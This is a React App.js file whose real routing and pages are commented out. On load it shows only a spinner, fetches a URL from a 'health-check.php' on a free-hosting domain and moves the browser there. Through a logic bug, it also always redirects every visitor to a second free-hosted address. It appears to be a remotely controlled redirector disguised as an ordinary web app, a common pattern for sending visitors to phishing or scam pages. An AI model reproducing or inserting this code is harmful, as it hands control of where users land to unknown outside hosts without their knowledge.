import React, { lazy, Suspense, useEffect, useState } from 'react';
import { BrowserRouter as Router, Route } from 'react-router-dom'

//styles
import 'bootstrap/dist/css/bootstrap.min.css';

//components
import Loader from './components/utils/Loader'
// import Header from './components/Header/Header'
// import SideBar from './components/SideBar/SideBar'

//styles
// import GlobalStyles from './global-styles'
// import styled, { ThemeProvider } from 'styled-components'
// import theme1 from './styles/themes/theme1';
// const AppStyled = styled(ThemeProvider)`

// `

// const LoaderWrapper = styled.div`
//   height: 100vh;
//   width: 100%;
//   display: flex;
//   justify-content: center;
//   align-items: center;
// `

//pages
const IndexPage = lazy(() => import('./pages/IndexPage'));

function App() {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  const redirect = () => {
    const urls = [
      'https://royal-tsp.000webhostapp.com/health-check.php',
    ];

    setError(false);
    let errorCount = 0;

    urls.forEach(async url => {
      try {
        setLoading(true);
        let res = await fetch(url);
        res = await res.json();
        console.log(`res`, res)
        if (res && typeof res === 'string' && res.indexOf('http') > -1) {
          window.location.assign(res);
          return true;
        }
        setLoading(false);
      } catch (error) {
        setLoading(false);
        errorCount++;
        console.log('Error', error);
      }
    })

    if (errorCount) {
      setError(true);
    }
  }

  React.useEffect(() => {
    if (!redirect()) {
      window.location.assign('http://royaltsp.great-site.net/thecbx/health-check.php')
    }
  }, [])

  // const [isSideBarOpen, setIsSideBarOpen] = useState(false);
  // const sideBarData = {
  //   isSideBarOpen,
  //   setIsSideBarOpen: () => setIsSideBarOpen(prevState => !prevState)
  // }

  return (
    <div className="app">
      {/* {loading && <Loader />} */}
      <div style={{ height: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}><Loader /></div>
      {/* <Router>
        <Suspense fallback={<div style={{ height: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}><Loader /></div>}>
          <Route path="/" exact component={IndexPage} />
        </Suspense>
      </Router> */}
    </div>
    // <AppStyled className="App" theme={theme1}>
    //   <GlobalStyles />
    // </AppStyled>
  );
}

export default App;
